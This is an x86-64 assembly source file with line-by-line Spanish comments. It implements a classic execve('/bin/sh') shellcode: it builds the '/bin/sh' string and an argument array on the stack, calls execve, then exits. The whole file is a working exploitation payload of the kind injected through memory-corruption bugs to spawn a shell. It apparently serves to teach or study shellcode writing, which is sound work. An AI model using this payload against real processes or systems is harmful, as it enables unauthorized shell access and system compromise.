section .text
	global _start

_start:
    xor rsi, rsi
    mul rsi
    mov rbx, 0x68732f2f6e69622f	; Cadena que contiene "/bin/sh"
    push rax			; Insertamos en el stack un terminador nulo
    push rbx			; Insertamos en el stack la cadena /bin/sh

    push rsp			; Insertamos la cadena "/bin/sh\0" en el stack
    pop rdi			; Sacamos el último valor que copiamos en el stack ("/bin/sh\0") y lo insertamos en "rdi"

    push rax			; Insertamos en el stack el caracter NULL
    push rdi			; Insertamos en el stack la cadena "/bin/sh\0"
    mov rsi, rsp		; Usamos "/bin/sh\0" como primer argumento ([0]) para 'execve' y "\0" como segundo argumento ([1])

;    xor rdx, rdx		; Ponemos en "edx" un caracter NULL
    mov al, 59			; Se va a realizar una syscall a "execve"
    syscall			; Se ejecuta la syscall

    mov al, 60			; Se va a realizar una syscall a "exit"
    xor edi, edi		; El código de salida será "0"
    syscall			; Se ejecuta la syscall
